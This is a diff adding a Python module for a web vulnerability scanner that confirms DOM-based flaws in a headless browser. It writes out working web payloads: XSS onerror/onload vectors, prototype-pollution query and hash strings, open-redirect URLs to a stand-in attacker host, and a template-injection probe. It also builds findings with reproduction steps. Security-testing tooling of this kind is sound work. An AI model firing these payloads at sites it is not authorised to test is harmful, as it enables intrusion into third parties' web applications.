@@ -1,0 +1,154 @@
+"""
+DOM audit — dynamic client-side source->sink confirmation (a mini DOM-Invader).
+
+The static js_review flags dangerous sinks (innerHTML, location, __proto__, deparam,
+AngularJS) as LEADS. This module turns the confirmable ones into CONFIRMED findings
+by driving a real headless browser: inject a unique marker into a DOM SOURCE
+(location.hash / a query param), load the page, and observe whether a SINK actually
+fired — proof, not suspicion. Four classes are confirmable with no false positives
+because each check keys on a unique canary that cannot occur naturally:
+
+  - Prototype pollution: `?__proto__[KEY]=VAL` (or via the hash) => after load,
+    Object.prototype[KEY] === VAL globally.
+  - DOM-based XSS: an auto-firing payload in the hash/param => alert() fires with
+    our marker (execution, not mere reflection).
+  - DOM-based open redirect: a URL source pointed at an attacker host => the page
+    navigates to that host.
+  - Client-side template injection: `{{7*7}}MARKER` in a reflected param => the DOM
+    renders `49MARKER` (the expression evaluated), only where a template engine runs.
+
+Pure/deterministic here (probe URLs + result interpretation + finding builders); the
+browser transport lives in tools._run_dom_audit.
+"""
+from __future__ import annotations
+
+from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode
+
+MARK = "bbhdom8842"          # unique canary (execution / render marker)
+PP_KEY = "bbhpp8842"         # prototype-pollution property name (must be unique)
+EVIL = "bbh-evil.example"    # attacker host for open-redirect confirmation
+
+EXEC_PAYLOADS = (
+    f'<img src=x onerror=alert("{MARK}")>',
+    f'<svg onload=alert("{MARK}")>',
+)
+# Query params that commonly feed a client-side redirect or a template.
+REDIRECT_PARAMS = ("returnUrl", "redirect", "url", "next", "return", "dest", "redir", "goto")
+TEMPLATE_PARAMS = ("search", "q", "query", "searchTerm", "message", "name", "s")
+
+
+def _set_fragment(url: str, value: str) -> str:
+    return urlunparse(urlparse(url)._replace(fragment=value))
+
+
+def _add_query(url: str, name: str, value: str) -> str:
+    p = urlparse(url)
+    pairs = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True) if k != name]
+    pairs.append((name, value))
+    return urlunparse(p._replace(query=urlencode(pairs)))
+
+
+def build_probes(url: str) -> list:
+    """Bounded set of DOM probes for one page. Each item:
+    {"class", "nav" (URL to load), "src" (source), "expect"}."""
+    probes = []
+    # ── prototype pollution: hash (deparam/hash routers) + query ──
+    for src, nav in (("hash", _set_fragment(url, f"__proto__[{PP_KEY}]={MARK}")),
+                     ("query", _add_query(url, f"__proto__[{PP_KEY}]", MARK)),
+                     ("hash", _set_fragment(url, f"constructor[prototype][{PP_KEY}]={MARK}"))):
+        probes.append({"class": "proto", "nav": nav, "src": src})
+    # ── DOM open redirect: hash + redirect-ish params ──
+    probes.append({"class": "redirect", "nav": _set_fragment(url, f"https://{EVIL}/"), "src": "hash"})
+    for pn in REDIRECT_PARAMS:
+        probes.append({"class": "redirect", "nav": _add_query(url, pn, f"https://{EVIL}/"), "src": pn})
+    # ── DOM XSS: hash execution (covers hashchange/render sinks) ──
+    for pl in EXEC_PAYLOADS:
+        probes.append({"class": "xss", "nav": _set_fragment(url, pl), "src": "hash"})
+    # ── CSTI: reflected template expression ──
+    for pn in TEMPLATE_PARAMS:
+        probes.append({"class": "csti", "nav": _add_query(url, pn, "{{7*7}}" + MARK), "src": pn})
+    # de-dup by nav URL, keep order, cap so the browser pass stays bounded
+    seen, out = set(), []
+    for p in probes:
+        if p["nav"] not in seen:
+            seen.add(p["nav"])
+            out.append(p)
+    return out[:16]
+
+
+# ── interpret one probe's browser result ─────────────────────────
+def confirmed_proto(pp_value) -> bool:
+    return pp_value == MARK
+
+
+def confirmed_redirect(nav_targets) -> bool:
+    return any(EVIL in (t or "").lower() for t in (nav_targets or []))
+
+
+def confirmed_xss(dialog_msg) -> bool:
+    return bool(dialog_msg) and MARK in str(dialog_msg)
+
+
+def confirmed_csti(body: str) -> bool:
+    # {{7*7}} rendered to 49 with the marker intact => the engine evaluated it.
+    return bool(body) and (f"49{MARK}" in body) and (f"{{{{7*7}}}}{MARK}" not in body)
+
+
+# ── finding builders (all CONFIRMED, with evidence) ──────────────
+def _base(url, title, sev, desc, evidence, family, cwe, tags, steps):
+    return {"title": title, "severity": sev, "target": url, "description": desc,
+            "impact": "Client-side code execution / manipulation in victims' browsers.",
+            "evidence": evidence, "reproduction_steps": steps, "cwe": cwe, "family": family,
+            "tags": tags, "confidence": "confirmed"}
+
+
+def proto_finding(url, nav, src):
+    return _base(url, f"Client-side prototype pollution (DOM, via {src})", "high",
+                 (f"Injecting a property through the {src} polluted Object.prototype globally "
+                  "(a client-side prototype-pollution gadget processed attacker input)."),
+                 f"Loaded {nav} → Object.prototype.{PP_KEY} === \"{MARK}\" after load.",
+                 "prototype_pollution", "CWE-1321", ["prototype-pollution", "dom"],
+                 [f"Load {nav}", f"In the console, read Object.prototype.{PP_KEY}",
+                  "Observe the attacker-controlled value is now global (pollution confirmed)"])
+
+
+def redirect_finding(url, nav, src):
+    return _base(url, f"DOM-based open redirection (via {src})", "medium",
+                 (f"A URL taken from the {src} is used to navigate the browser without validation, so "
+                  "the page can be made to send visitors to an attacker-chosen site."),
+                 f"Loaded {nav} → the page navigated to https://{EVIL}/.",
+                 "open_redirect", "CWE-601", ["open-redirect", "dom"],
+                 [f"Load {nav}", f"Observe the browser navigate to https://{EVIL}/"])
+
+
+def xss_finding(url, nav, src):
+    return _base(url, f"DOM-based XSS (via {src})", "high",
+                 (f"A payload delivered through the {src} reached a DOM sink and EXECUTED in a real "
+                  "browser (alert fired) — attacker script runs in the victim's session."),
+                 f"Loaded {nav} → alert(\"{MARK}\") executed.",
+                 "xss", "CWE-79", ["xss", "dom"],
+                 [f"Load {nav}", "Observe alert() fire (script executed from the DOM source)"])
+
+
+def csti_finding(url, nav, src):
+    return _base(url, f"Client-side template injection (CSTI, via {src})", "high",
+                 (f"Input in '{src}' is rendered by a client-side template engine (e.g. AngularJS): the "
+                  "expression {{7*7}} evaluated to 49, so attacker expressions run in the browser."),
+                 f"Loaded {nav} → the DOM rendered \"49{MARK}\" (the template evaluated 7*7).",
+                 "ssti", "CWE-1336", ["csti", "ssti", "dom"],
+                 [f"Load {nav}", "Observe 49 rendered in place of {{7*7}} (expression evaluated)"])
+
+
+def build_finding(probe: dict, *, pp_value=None, nav_targets=None, dialog_msg=None, body=None):
+    """Return a CONFIRMED finding for a probe whose browser result proves the class,
+    else None. One place so the transport never has to guess."""
+    cls, url, nav, src = probe["class"], probe.get("base", probe["nav"]), probe["nav"], probe["src"]
+    if cls == "proto" and confirmed_proto(pp_value):
+        return proto_finding(url, nav, src)
+    if cls == "redirect" and confirmed_redirect(nav_targets):
+        return redirect_finding(url, nav, src)
+    if cls == "xss" and confirmed_xss(dialog_msg):
+        return xss_finding(url, nav, src)
+    if cls == "csti" and confirmed_csti(body):
+        return csti_finding(url, nav, src)
+    return None
